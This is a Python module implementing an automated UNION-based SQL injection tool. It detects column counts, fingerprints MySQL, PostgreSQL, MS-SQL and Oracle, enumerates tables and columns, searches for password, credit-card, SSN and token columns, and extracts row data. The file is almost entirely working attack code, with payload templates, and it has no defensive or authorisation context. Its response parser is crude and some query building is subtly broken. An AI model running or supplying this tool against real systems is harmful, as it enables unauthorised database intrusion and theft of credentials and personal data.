"""
UNION-Based SQL Injection Attacker Module

This module provides advanced UNION-based SQL injection techniques with full automation
for discovering column counts, mining database metadata, and extracting data.

Supports multiple database management systems:
- MySQL
- PostgreSQL
- Microsoft SQL Server (MS-SQL)
- Oracle

Features:
1. Column Count Discovery - Automatically find required columns for UNION attacks
2. Metadata Mining - Discover table and column names from information schema
3. Data Extraction - Extract data from discovered tables
4. DBMS-Adaptive Queries - Use appropriate syntax for each database type

Example usage:
    >>> attacker = UnionSQLInjectionAttacker(send_request_callback=my_request_function)
    >>> attacker.set_target("http://example.com/product?id=1")
    >>> 
    >>> # Discover column count
    >>> column_count = attacker.discover_column_count()
    >>> print(f"Found {column_count} columns")
    >>> 
    >>> # Mine database metadata
    >>> tables = attacker.discover_tables()
    >>> columns = attacker.discover_columns(table_name="users")
    >>> 
    >>> # Extract data
    >>> data = attacker.extract_data(table="users", columns=["username", "password"])
    >>> for row in data:
    >>>     print(row)
"""

import re
import time
import logging
from typing import Dict, List, Optional, Callable, Tuple, Any
from enum import Enum

logger = logging.getLogger(__name__)


class DBMSType(Enum):
    """Supported database management systems."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    UNKNOWN = "unknown"


class UnionSQLInjectionAttacker:
    """
    Advanced UNION-based SQL injection attack automation.
    
    This class provides methods to:
    - Automatically discover the column count needed for UNION attacks
    - Mine database metadata (tables, columns)
    - Extract data from discovered tables
    - Support multiple DBMS types with adaptive queries
    
    Attributes:
        send_request: Callback function for sending HTTP requests
        dbms_type: Detected or specified DBMS type
        column_count: Discovered column count for UNION attacks
        injectable_columns: List of column positions that display output
    """
    
    def __init__(self, 
                 send_request_callback: Callable[[str, Optional[Dict]], Tuple[str, int, Dict]],
                 dbms_type: Optional[DBMSType] = None,
                 max_columns: int = 20,
                 delay: float = 0.5):
        """
        Initialize the UNION SQL injection attacker.
        
        Args:
            send_request_callback: Function that sends HTTP requests.
                Should accept (url, params_dict) and return (response_body, status_code, headers)
            dbms_type: Optionally specify the DBMS type. If None, will attempt detection.
            max_columns: Maximum number of columns to test during discovery (default: 20)
            delay: Delay between requests in seconds (default: 0.5)
        """
        self.send_request = send_request_callback
        self.dbms_type = dbms_type or DBMSType.UNKNOWN
        self.max_columns = max_columns
        self.delay = delay
        
        # State tracking
        self.target_url = None
        self.injection_point = None
        self.column_count = None
        self.injectable_columns = []
        self.baseline_response = None
        self.baseline_length = 0
        
        logger.info("UnionSQLInjectionAttacker initialized")
    
    def set_target(self, url: str, injection_point: Optional[str] = None):
        """
        Set the target URL and injection point.
        
        Args:
            url: Target URL (e.g., "http://example.com/product?id=1")
            injection_point: Parameter name to inject into (e.g., "id").
                If None, will attempt to detect from URL.
        """
        self.target_url = url
        
        # Extract injection point from URL if not provided
        if injection_point is None and '?' in url:
            params_str = url.split('?', 1)[1]
            if '=' in params_str:
                self.injection_point = params_str.split('=')[0].split('&')[0]
        else:
            self.injection_point = injection_point
        
        # Get baseline response
        try:
            response_body, status_code, headers = self.send_request(url, None)
            self.baseline_response = response_body
            self.baseline_length = len(response_body)
            logger.info(f"Target set: {url}, injection point: {self.injection_point}")
            logger.info(f"Baseline response length: {self.baseline_length}")
        except Exception as e:
            logger.error(f"Error getting baseline response: {e}")
            self.baseline_response = ""
            self.baseline_length = 0
    
    def discover_column_count(self, start_count: int = 1) -> Optional[int]:
        """
        Automatically discover the number of columns required for UNION attacks.
        
        Uses the technique of incrementally adding NULL values in SELECT until
        no error occurs and the injected row displays properly.
        
        Args:
            start_count: Starting column count to test (default: 1)
        
        Returns:
            Number of columns discovered, or None if discovery fails
        
        Example:
            >>> column_count = attacker.discover_column_count()
            >>> print(f"Discovered {column_count} columns")
        """
        if not self.target_url or not self.injection_point:
            logger.error("Target URL and injection point must be set first")
            return None
        
        logger.info(f"Starting column count discovery from {start_count} to {self.max_columns}")
        
        for col_num in range(start_count, self.max_columns + 1):
            # Build UNION payload with NULL values
            nulls = ','.join(['NULL'] * col_num)
            
            # Try different comment styles for different DBMS
            comment_styles = ['--', '#', '/*']
            
            for comment in comment_styles:
                payload = f"' UNION SELECT {nulls}{comment}"
                test_url = self._inject_payload(payload)
                
                try:
                    time.sleep(self.delay)
                    response_body, status_code, headers = self.send_request(test_url, None)
                    
                    # Check for success indicators
                    if self._is_successful_union(response_body, status_code):
                        self.column_count = col_num
                        logger.info(f"Successfully discovered {col_num} columns using comment: {comment}")
                        
                        # Identify which columns display in output
                        self._identify_injectable_columns(col_num, comment)
                        return col_num
                    
                except Exception as e:
                    logger.debug(f"Error testing {col_num} columns with {comment}: {e}")
                    continue
        
        logger.warning(f"Could not discover column count up to {self.max_columns}")
        return None
    
    def _identify_injectable_columns(self, column_count: int, comment_style: str):
        """
        Identify which columns in the UNION SELECT are displayed in the response.
        
        Args:
            column_count: Number of columns in the UNION
            comment_style: Comment style that worked (e.g., '--', '#')
        """
        logger.info("Identifying injectable columns...")
        self.injectable_columns = []
        
        # Test each column position with a unique marker
        for col_pos in range(1, column_count + 1):
            marker = f"INJECTABLE_{col_pos}_TEST"
            columns = []
            
            for i in range(1, column_count + 1):
                if i == col_pos:
                    columns.append(f"'{marker}'")
                else:
                    columns.append('NULL')
            
            payload = f"' UNION SELECT {','.join(columns)}{comment_style}"
            test_url = self._inject_payload(payload)
            
            try:
                time.sleep(self.delay)
                response_body, status_code, headers = self.send_request(test_url, None)
                
                if marker in response_body:
                    self.injectable_columns.append(col_pos)
                    logger.info(f"Column {col_pos} is injectable (displays in output)")
            
            except Exception as e:
                logger.debug(f"Error testing column {col_pos}: {e}")
        
        if not self.injectable_columns:
            logger.warning("No injectable columns found - output may not be visible")
        else:
            logger.info(f"Found {len(self.injectable_columns)} injectable columns: {self.injectable_columns}")
    
    def detect_dbms(self) -> DBMSType:
        """
        Attempt to detect the database management system type.
        
        Uses DBMS-specific functions and error messages to fingerprint the database.
        
        Returns:
            Detected DBMS type
        
        Example:
            >>> dbms = attacker.detect_dbms()
            >>> print(f"Detected DBMS: {dbms.value}")
        """
        if self.dbms_type != DBMSType.UNKNOWN:
            return self.dbms_type
        
        logger.info("Attempting to detect DBMS type...")
        
        # DBMS fingerprinting payloads
        fingerprints = [
            (DBMSType.MYSQL, ["' AND @@version LIKE '%'--", "' AND VERSION() LIKE '%'--"]),
            (DBMSType.POSTGRESQL, ["' AND version() LIKE '%'--", "' AND pg_sleep(0)=0--"]),
            (DBMSType.MSSQL, ["' AND @@version LIKE '%'--", "' AND SYSTEM_USER LIKE '%'--"]),
            (DBMSType.ORACLE, ["' AND banner LIKE '%' FROM v$version--", "' AND ROWNUM=1--"]),
        ]
        
        for dbms_type, payloads in fingerprints:
            for payload in payloads:
                test_url = self._inject_payload(payload)
                
                try:
                    time.sleep(self.delay)
                    response_body, status_code, headers = self.send_request(test_url, None)
                    
                    # Check for DBMS-specific error messages or behaviors
                    if self._check_dbms_indicators(response_body, dbms_type):
                        self.dbms_type = dbms_type
                        logger.info(f"Detected DBMS: {dbms_type.value}")
                        return dbms_type
                
                except Exception as e:
                    logger.debug(f"Error during DBMS detection: {e}")
                    continue
        
        logger.warning("Could not detect DBMS type")
        self.dbms_type = DBMSType.UNKNOWN
        return self.dbms_type
    
    def discover_tables(self, schema: Optional[str] = None, pattern: Optional[str] = None) -> List[str]:
        """
        Discover table names in the database.
        
        Queries information_schema.tables (MySQL, PostgreSQL, MS-SQL) or
        all_tables (Oracle) to enumerate available tables.
        
        Args:
            schema: Specific database schema to query (optional)
            pattern: SQL LIKE pattern to filter table names (e.g., '%user%')
        
        Returns:
            List of discovered table names
        
        Example:
            >>> tables = attacker.discover_tables(pattern="%user%")
            >>> for table in tables:
            >>>     print(f"Found table: {table}")
        """
        if self.column_count is None:
            logger.error("Column count must be discovered first")
            return []
        
        if not self.injectable_columns:
            logger.warning("No injectable columns identified - results may not be visible")
        
        logger.info(f"Discovering tables (schema: {schema}, pattern: {pattern})")
        
        # Build DBMS-specific query
        if self.dbms_type == DBMSType.ORACLE:
            query = "SELECT table_name FROM all_tables"
            if pattern:
                query += f" WHERE table_name LIKE '{pattern}'"
        else:
            # MySQL, PostgreSQL, MS-SQL use information_schema
            query = "SELECT table_name FROM information_schema.tables"
            conditions = []
            
            if schema:
                conditions.append(f"table_schema='{schema}'")
            elif self.dbms_type == DBMSType.MYSQL:
                conditions.append("table_schema=database()")
            
            if pattern:
                conditions.append(f"table_name LIKE '{pattern}'")
            
            if conditions:
                query += " WHERE " + " AND ".join(conditions)
        
        # Execute query and extract results
        tables = self._execute_union_query(query)
        logger.info(f"Discovered {len(tables)} tables")
        return tables
    
    def discover_columns(self, 
                        table_name: str, 
                        schema: Optional[str] = None,
                        pattern: Optional[str] = None) -> List[Dict[str, str]]:
        """
        Discover column names for a specific table.
        
        Queries information_schema.columns (MySQL, PostgreSQL, MS-SQL) or
        all_tab_columns (Oracle) to enumerate columns in a table.
        
        Args:
            table_name: Name of the table to query
            schema: Specific database schema (optional)
            pattern: SQL LIKE pattern to filter column names (e.g., '%pass%')
        
        Returns:
            List of dictionaries with column information (name, type, etc.)
        
        Example:
            >>> columns = attacker.discover_columns("users", pattern="%pass%")
            >>> for col in columns:
            >>>     print(f"Column: {col['column_name']} ({col['data_type']})")
        """
        if self.column_count is None:
            logger.error("Column count must be discovered first")
            return []
        
        logger.info(f"Discovering columns for table: {table_name}")
        
        # Build DBMS-specific query for column discovery
        if self.dbms_type == DBMSType.ORACLE:
            # Oracle uses all_tab_columns
            concat_func = "column_name||'|'||data_type"
            query = f"SELECT {concat_func} FROM all_tab_columns WHERE table_name='{table_name.upper()}'"
            if pattern:
                query += f" AND column_name LIKE '{pattern.upper()}'"
        else:
            # MySQL, PostgreSQL, MS-SQL use information_schema.columns
            concat_func = self._get_concat_function(
                ["column_name", "'|'", "data_type"]
            )
            query = f"SELECT {concat_func} FROM information_schema.columns WHERE table_name='{table_name}'"
            
            if schema:
                query += f" AND table_schema='{schema}'"
            elif self.dbms_type == DBMSType.MYSQL:
                query += " AND table_schema=database()"
            
            if pattern:
                query += f" AND column_name LIKE '{pattern}'"
        
        # Execute query and parse results
        results = self._execute_union_query(query)
        
        columns = []
        for result in results:
            if '|' in result:
                parts = result.split('|')
                columns.append({
                    'column_name': parts[0],
                    'data_type': parts[1] if len(parts) > 1 else 'unknown'
                })
        
        logger.info(f"Discovered {len(columns)} columns in {table_name}")
        return columns
    
    def extract_data(self, 
                    table: str, 
                    columns: List[str],
                    where_clause: Optional[str] = None,
                    limit: int = 100) -> List[Dict[str, str]]:
        """
        Extract data from a table using discovered column information.
        
        Args:
            table: Table name to extract from
            columns: List of column names to extract
            where_clause: Optional WHERE clause for filtering (e.g., "id > 5")
            limit: Maximum number of rows to extract (default: 100)
        
        Returns:
            List of dictionaries representing rows of data
        
        Example:
            >>> data = attacker.extract_data("users", ["username", "email"], limit=10)
            >>> for row in data:
            >>>     print(f"User: {row['username']}, Email: {row['email']}")
        """
        if self.column_count is None:
            logger.error("Column count must be discovered first")
            return []
        
        logger.info(f"Extracting data from {table}, columns: {columns}")
        
        # Build concatenated column expression
        concat_parts = []
        for i, col in enumerate(columns):
            concat_parts.append(col)
            if i < len(columns) - 1:
                concat_parts.append("'|'")
        
        concat_expr = self._get_concat_function(concat_parts)
        
        # Build query
        query = f"SELECT {concat_expr} FROM {table}"
        if where_clause:
            query += f" WHERE {where_clause}"
        
        # Add DBMS-specific LIMIT clause
        if self.dbms_type == DBMSType.MYSQL or self.dbms_type == DBMSType.POSTGRESQL:
            query += f" LIMIT {limit}"
        elif self.dbms_type == DBMSType.MSSQL:
            query = query.replace("SELECT", f"SELECT TOP {limit}", 1)
        elif self.dbms_type == DBMSType.ORACLE:
            query += f" AND ROWNUM <= {limit}"
        
        # Execute query
        results = self._execute_union_query(query)
        
        # Parse results into dictionaries
        data = []
        for result in results:
            if '|' in result:
                values = result.split('|')
                if len(values) == len(columns):
                    row = {columns[i]: values[i] for i in range(len(columns))}
                    data.append(row)
        
        logger.info(f"Extracted {len(data)} rows from {table}")
        return data
    
    def search_sensitive_columns(self, patterns: List[str] = None) -> Dict[str, List[Dict]]:
        """
        Search for potentially sensitive columns across all tables.
        
        Useful for finding password, credit card, SSN, and other sensitive data columns.
        
        Args:
            patterns: List of SQL LIKE patterns to search for.
                Default: ['%pass%', '%pwd%', '%credit%', '%card%', '%ssn%', '%secret%']
        
        Returns:
            Dictionary mapping table names to lists of matching columns
        
        Example:
            >>> sensitive = attacker.search_sensitive_columns()
            >>> for table, columns in sensitive.items():
            >>>     print(f"Table {table} has sensitive columns: {columns}")
        """
        if patterns is None:
            patterns = ['%pass%', '%pwd%', '%credit%', '%card%', '%ssn%', '%secret%',
                       '%token%', '%key%', '%hash%', '%email%']
        
        logger.info(f"Searching for sensitive columns with patterns: {patterns}")
        
        # First, discover all tables
        all_tables = self.discover_tables()
        
        sensitive_data = {}
        
        # For each table, search for columns matching patterns
        for table in all_tables:
            for pattern in patterns:
                columns = self.discover_columns(table, pattern=pattern)
                if columns:
                    if table not in sensitive_data:
                        sensitive_data[table] = []
                    sensitive_data[table].extend(columns)
        
        logger.info(f"Found sensitive columns in {len(sensitive_data)} tables")
        return sensitive_data
    
    # Helper methods
    
    def _inject_payload(self, payload: str) -> str:
        """
        Inject a payload into the target URL.
        
        Args:
            payload: SQL injection payload
        
        Returns:
            Modified URL with payload injected
        """
        if not self.target_url or not self.injection_point:
            return self.target_url
        
        # Parse URL and inject payload
        if '?' in self.target_url:
            base_url, params = self.target_url.split('?', 1)
            param_parts = []
            
            for param in params.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    if key == self.injection_point:
                        # Inject payload
                        param_parts.append(f"{key}={value}{payload}")
                    else:
                        param_parts.append(param)
                else:
                    param_parts.append(param)
            
            return f"{base_url}?{'&'.join(param_parts)}"
        else:
            return f"{self.target_url}{payload}"
    
    def _is_successful_union(self, response_body: str, status_code: int) -> bool:
        """
        Check if a UNION attempt was successful.
        
        Args:
            response_body: HTTP response body
            status_code: HTTP status code
        
        Returns:
            True if UNION was successful, False otherwise
        """
        # Check for HTTP success
        if status_code not in [200, 201]:
            return False
        
        # Check for common SQL error messages (failure indicators)
        error_patterns = [
            r'sql syntax',
            r'mysql_fetch',
            r'num_rows',
            r'pg_query',
            r'ORA-\d+',
            r'SQL Server',
            r'ODBC.*Driver',
            r'SQLite',
            r'Warning.*mysql',
            r'valid MySQL result',
            r'PostgreSQL.*ERROR',
            r'division by zero',
            r'used when column count does not match',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return False
        
        # Check if response differs significantly from baseline (success indicator)
        if self.baseline_response and abs(len(response_body) - self.baseline_length) > 50:
            return True
        
        return True  # Assume success if no errors and valid status
    
    def _check_dbms_indicators(self, response_body: str, dbms_type: DBMSType) -> bool:
        """
        Check response for DBMS-specific indicators.
        
        Args:
            response_body: HTTP response body
            dbms_type: DBMS type to check for
        
        Returns:
            True if indicators match the DBMS type
        """
        indicators = {
            DBMSType.MYSQL: [r'mysql', r'MariaDB'],
            DBMSType.POSTGRESQL: [r'PostgreSQL', r'pg_'],
            DBMSType.MSSQL: [r'SQL Server', r'Microsoft.*SQL'],
            DBMSType.ORACLE: [r'Oracle', r'ORA-\d+'],
        }
        
        patterns = indicators.get(dbms_type, [])
        for pattern in patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _get_concat_function(self, parts: List[str]) -> str:
        """
        Get DBMS-appropriate string concatenation function.
        
        Args:
            parts: List of strings/columns to concatenate
        
        Returns:
            DBMS-specific concatenation expression
        """
        if self.dbms_type == DBMSType.MYSQL:
            return f"CONCAT({','.join(parts)})"
        elif self.dbms_type == DBMSType.POSTGRESQL:
            return '||'.join(parts)
        elif self.dbms_type == DBMSType.MSSQL:
            return '+'.join(parts)
        elif self.dbms_type == DBMSType.ORACLE:
            return '||'.join(parts)
        else:
            # Default to CONCAT for unknown DBMS
            return f"CONCAT({','.join(parts)})"
    
    def _execute_union_query(self, query: str) -> List[str]:
        """
        Execute a UNION-based query and extract results.
        
        Args:
            query: SQL query to execute via UNION
        
        Returns:
            List of extracted values from the query
        """
        if not self.injectable_columns:
            logger.warning("No injectable columns - using first column position")
            injectable_col = 1
        else:
            injectable_col = self.injectable_columns[0]
        
        # Build UNION payload with query in injectable column
        columns = []
        for i in range(1, self.column_count + 1):
            if i == injectable_col:
                columns.append(f"({query})")
            else:
                columns.append('NULL')
        
        # Try different comment styles
        results = []
        for comment in ['--', '#', '/*']:
            payload = f"' UNION SELECT {','.join(columns)}{comment}"
            test_url = self._inject_payload(payload)
            
            try:
                time.sleep(self.delay)
                response_body, status_code, headers = self.send_request(test_url, None)
                
                # Extract results from response
                extracted = self._extract_results_from_response(response_body)
                if extracted:
                    results.extend(extracted)
                    break  # Stop if we got results
            
            except Exception as e:
                logger.debug(f"Error executing UNION query: {e}")
                continue
        
        return results
    
    def _extract_results_from_response(self, response_body: str) -> List[str]:
        """
        Extract injected data from HTTP response.
        
        This is a basic implementation that looks for patterns.
        Should be customized based on target application's response format.
        
        Args:
            response_body: HTTP response body
        
        Returns:
            List of extracted values
        """
        results = []
        
        # Look for common patterns that might indicate injected data
        # This is a simplified approach - real implementation would be more sophisticated
        
        # Look for table/column names (alphanumeric with underscores)
        table_pattern = r'\b[a-z_][a-z0-9_]{2,30}\b'
        matches = re.findall(table_pattern, response_body, re.IGNORECASE)
        
        # Filter out common HTML/English words
        common_words = {'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 
                       'can', 'her', 'was', 'one', 'our', 'out', 'div', 'span',
                       'class', 'name', 'type', 'text', 'href', 'src', 'alt'}
        
        for match in matches:
            if match.lower() not in common_words and len(match) > 2:
                if match not in results:
                    results.append(match)
        
        return results[:50]  # Limit results to avoid noise


# Example usage functions

def example_basic_usage():
    """
    Example of basic UNION SQL injection attack flow.
    
    This demonstrates the complete attack chain from column discovery
    to data extraction.
    """
    def mock_request(url, params):
        """Mock request function for demonstration."""
        # In real usage, this would be replaced with actual HTTP library
        return "<html>Mock response</html>", 200, {}
    
    # Initialize attacker
    attacker = UnionSQLInjectionAttacker(
        send_request_callback=mock_request,
        max_columns=10,
        delay=0.1
    )
    
    # Set target
    attacker.set_target("http://example.com/product?id=1")
    
    # Detect DBMS
    dbms = attacker.detect_dbms()
    print(f"Detected DBMS: {dbms.value}")
    
    # Discover column count
    column_count = attacker.discover_column_count()
    if column_count:
        print(f"Found {column_count} columns")
        
        # Discover tables
        tables = attacker.discover_tables()
        print(f"Found {len(tables)} tables: {tables[:5]}")
        
        # Discover columns in a table
        if tables:
            columns = attacker.discover_columns(tables[0])
            print(f"Columns in {tables[0]}: {[c['column_name'] for c in columns]}")
            
            # Extract data
            if columns:
                col_names = [c['column_name'] for c in columns[:3]]
                data = attacker.extract_data(tables[0], col_names, limit=5)
                print(f"Extracted {len(data)} rows")
                for row in data[:3]:
                    print(row)


def example_sensitive_data_search():
    """
    Example of searching for sensitive data across the database.
    
    Demonstrates how to find password fields, credit cards, etc.
    """
    def mock_request(url, params):
        return "<html>Mock response</html>", 200, {}
    
    attacker = UnionSQLInjectionAttacker(send_request_callback=mock_request)
    attacker.set_target("http://example.com/product?id=1")
    
    # Discover column count first
    if attacker.discover_column_count():
        # Search for sensitive columns
        sensitive = attacker.search_sensitive_columns(
            patterns=['%pass%', '%pwd%', '%credit%', '%ssn%']
        )
        
        print("Sensitive data found:")
        for table, columns in sensitive.items():
            print(f"\nTable: {table}")
            for col in columns:
                print(f"  - {col['column_name']} ({col['data_type']})")
                
                # Extract sample data from sensitive columns
                data = attacker.extract_data(
                    table, 
                    [col['column_name']], 
                    limit=3
                )
                for row in data:
                    print(f"    Sample: {row}")


if __name__ == "__main__":
    # Run examples
    print("=" * 60)
    print("UNION-Based SQL Injection Attacker - Basic Usage")
    print("=" * 60)
    example_basic_usage()
    
    print("\n" + "=" * 60)
    print("UNION-Based SQL Injection Attacker - Sensitive Data Search")
    print("=" * 60)
    example_sensitive_data_search()
